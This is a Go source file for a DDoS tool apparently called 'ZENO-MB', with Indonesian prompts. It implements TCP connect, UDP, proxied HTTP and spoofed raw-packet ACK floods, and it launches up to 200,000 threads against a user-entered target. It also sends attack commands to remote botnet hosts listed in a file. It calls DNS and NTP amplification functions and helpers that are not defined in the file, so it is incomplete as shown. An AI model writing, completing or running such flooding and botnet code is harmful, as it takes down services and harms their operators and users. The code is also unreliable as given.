package main

import (
	"bufio"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
        "net/url"
	"os"
	"strings"
	"sync"
	"time"

        "github.com/google/gopacket"
        "github.com/google/gopacket/layers"
        "github.com/google/gopacket/pcap"
)

var userAgents = []string{
	"Mozilla/5.0", "curl/7.64.1", "Wget/1.20.3",
	"python-requests/2.25.1", "Go-http-client/1.1",
}

func clear() {
	fmt.Print("\033[H\033[2J")
}

func readLines(filename string) []string {
	file, err := os.Open(filename)
	if err != nil {
		return []string{}
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			lines = append(lines, line)
		}
	}
	return lines
}

func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(254)+1, rand.Intn(255), rand.Intn(255), rand.Intn(254)+1)
}

// L3/L4 - SYN Flood
func synFlood(target string, port string, wg *sync.WaitGroup) {
	defer wg.Done()
	for {
		conn, err := net.Dial("tcp", target+":"+port)
		if err == nil {
			conn.Close()
		}
	}
}

// L4 - UDP Flood
func udpFlood(target string, port string, wg *sync.WaitGroup) {
	defer wg.Done()
	addr, err := net.ResolveUDPAddr("udp", target+":"+port)
	if err != nil {
		return
	}
	conn, _ := net.DialUDP("udp", nil, addr)
	defer conn.Close()

	payload := make([]byte, 2096)
	for {
		rand.Read(payload)
		conn.Write(payload)
	}
}

// L7 - HTTP Flood
func httpFlood(target string, port string, proxies []string, wg *sync.WaitGroup) {
	defer wg.Done()
	for {
		proxy := ""
		if len(proxies) > 0 {
			proxy = proxies[rand.Intn(len(proxies))]
		}

		client := &http.Client{
			Timeout: 3 * time.Second,
		}

		if proxy != "" {
			proxyURL := fmt.Sprintf("http://%s", proxy)
			proxyFunc := http.ProxyURL(&url.URL{Host: proxyURL})
			client.Transport = &http.Transport{Proxy: proxyFunc}
		}

		req, err := http.NewRequest("GET", fmt.Sprintf("http://%s:%s", target, port), nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
		req.Header.Set("X-Forwarded-For", randomIP())
		req.Header.Set("Connection", "keep-alive")

		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("[!] HTTP/Proxy gagal")
			continue
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		fmt.Printf("[L7] %d via %s\n", resp.StatusCode, proxy)
	}
}

// L4 - Real TCP ACK Flood using gopacket
func ackFlood(target string, port string, wg *sync.WaitGroup) {
	defer wg.Done()

	handle, err := pcap.OpenLive("eth0", 65535, false, pcap.BlockForever)
	if err != nil {
		fmt.Println("[X] Gagal buka interface:", err)
		return
	}
	defer handle.Close()

	dstIP := net.ParseIP(target)
	dstPort := layers.TCPPort(atoiSafe(port))

	for {
		ip := layers.IPv4{
			SrcIP:    net.ParseIP(randomIP()),
			DstIP:    dstIP,
			Version:  4,
			TTL:      64,
			Protocol: layers.IPProtocolTCP,
		}

		tcp := layers.TCP{
			SrcPort: layers.TCPPort(rand.Intn(65535-1024) + 1024),
			DstPort: dstPort,
			Seq:     rand.Uint32(),
			ACK:     true,
			ACKNum:  0,
			Window:  14600,
			SYN:     false,
			ACKFlag: true,
		}

		tcp.SetNetworkLayerForChecksum(&ip)

		buffer := gopacket.NewSerializeBuffer()
		opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
		err = gopacket.SerializeLayers(buffer, opts, &ip, &tcp)
		if err != nil {
			continue
		}

		handle.WritePacketData(buffer.Bytes())
	}
}

// Trigger Botnet
func remoteTrigger(bots []string, target string, port string) {
	for _, bot := range bots {
		url := fmt.Sprintf("http://%s/attack?target=%s&port=%s", bot, target, port)
		resp, err := http.Get(url)
		if err != nil {
			fmt.Printf("[!] Bot %s tidak aktif\n", bot)
		} else {
			fmt.Printf("[C2] Bot %s respon: %d\n", bot, resp.StatusCode)
			resp.Body.Close()
		}
	}
}

func RunAttack() {
    rand.Seed(time.Now().UnixNano())
    clear()

    fmt.Println(`
╔═══════════════════════════════════════════════╗
║       🔥 ZENO-MB ULTIMATE ATTACK MODE 🔥      ║
║        HDN Cyber Forces | RIFQI SYSTEM        ║
╠═══════════════════════════════════════════════╣
║      L3 + L4 + L7 | Real Attack + BotNet      ║
╚═══════════════════════════════════════════════╝
`)

    reader := bufio.NewReader(os.Stdin)

    fmt.Print("[?] Masukkan IP/Domain target: ")
    target, _ := reader.ReadString('\n')
    target = strings.TrimSpace(target)

    fmt.Print("[?] Masukkan port (80/443/22/8080): ")
    port, _ := reader.ReadString('\n')
    port = strings.TrimSpace(port)

    fmt.Print("[?] Jumlah thread lokal (default: 5000): ")
    var threadCount int
    _, err := fmt.Scanf("%d", &threadCount)
    if err != nil || threadCount <= 0 {
        threadCount = 200000
    }

    bots := readLines("bots.txt")
    proxies := readLines("proxy.txt") // Don't forget to load proxies

    var wg sync.WaitGroup

    // 1. Amplification Attacks with proper WaitGroup handling
    reflectorsDNS := readReflectors("reflectors_dns.txt")
    for i := 0; i < 5; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()
            dnsAmpFlood(target, reflectorsDNS)
        }()
    }

    reflectorsNTP := readReflectors("reflectors_ntp.txt")
    wg.Add(1)
    go func() {
        defer wg.Done()
        ntpAmpFlood(target, reflectorsNTP)
    }()

    // 2. Original Attacks (SYN/UDP/HTTP/ACK)
    for i := 0; i < threadCount; i++ {
        wg.Add(4)
        go synFlood(target, port, &wg)
        go udpFlood(target, port, &wg)
        go httpFlood(target, port, proxies, &wg)
        go ackFlood(target, port, &wg)
    }

    // 3. Trigger botnet
    wg.Add(1)
    go func() {
        defer wg.Done()
        remoteTrigger(bots, target, port)
    }()

    fmt.Printf("\n[✓] Serangan dimulai ke %s:%s dengan %d thread lokal + %d bot remote\n", target, port, threadCount*4, len(bots))
    fmt.Println("[!] Tekan CTRL+C untuk hentikan manual\n")

    wg.Wait()
}
